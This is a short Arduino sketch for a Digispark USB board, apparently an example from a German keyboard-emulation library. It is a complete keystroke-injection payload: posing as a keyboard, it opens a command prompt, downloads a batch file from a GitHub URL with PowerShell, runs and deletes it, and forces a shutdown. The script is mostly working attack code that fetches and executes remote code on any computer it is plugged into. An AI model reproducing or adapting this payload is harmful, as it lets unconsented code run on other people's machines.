#include <C:\Users\Tim\Desktop\Github\Digispark-German-Keyboard-API\GermanKeyboard.h>

void setup()
{
	pinMode(1, OUTPUT);
	DigiKeyboard.delay(1);
	digitalWrite(1, HIGH);
	DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
	DigiKeyboard.delay(400);
	pn("cmd", 400);
	pn("cd %homepath%");
	// Here we just download the Background.bat from https://github.com/timmyrs/Digispark-German-Keyboard-API/blob/master/examples/Background/Background.bat
	// Which will download & set the background image
	pn("powershell -Command \"Invoke-WebRequest https://raw.githubusercontent.com/timmyrs/Digispark-German-Keyboard-API/master/examples/Background/Background.bat -UseBasicParsing -OutFile Background.bat\"");
	pn("Background.bat");
	pn("cd %homepath%");
	pn("del Background.bat");
	pn("shutdown -f");
	digitalWrite(1, LOW);
}

void loop(){}
